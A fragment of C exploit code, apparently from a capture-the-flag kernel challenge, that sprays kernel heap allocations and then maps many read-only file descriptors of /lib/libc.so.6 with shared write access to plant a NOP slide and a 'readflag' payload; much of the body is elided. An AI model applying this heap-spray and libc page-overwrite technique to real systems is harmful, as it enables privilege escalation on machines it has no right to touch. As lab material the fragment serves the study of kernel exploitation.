...
int main(int argc, char *argv[]) {
  ...
  void *ptrs[SPRAY_VULN] = {0};
  for (int i = 0; i < SPRAY_VULN; i++)
    ptrs[i] = keap_malloc(FILE_SIZE, GFP_KERNEL);
  ...
  int libc_fds[SPRAY_VICT];
  for (int i = 0; i < SPRAY_VICT; i++)
    libc_fds[i] = SYSCHK(open("/lib/libc.so.6", O_RDONLY));
  ...
  for (int i = 0; i < SPRAY_VICT; i++) {
    ...
    void *libc_map = mmap(0, NOP_SLIDE_SIZE + sizeof(readflag),
                          PROT_WRITE | PROT_READ, MAP_SHARED, libc_fds[i], 0);
